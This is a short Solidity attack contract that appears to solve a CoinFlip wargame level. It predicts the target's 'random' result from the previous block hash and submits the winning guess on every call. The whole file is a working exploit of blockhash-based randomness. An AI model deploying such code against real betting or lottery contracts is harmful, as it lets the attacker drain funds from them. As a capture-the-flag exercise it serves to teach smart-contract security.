pragma solidity 0.8.8;

import "./interfaces/ICoinFlip.sol";
import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract Flipper {

    using SafeMath for uint256;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip public coinflip;

    constructor(address _coinFlip) {
        coinflip = ICoinFlip(_coinFlip);
    }

    function flip() external {
        bool outcome = getResult();
        coinflip.flip(outcome);
    }

    function getResult() internal view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        return side;
    }
}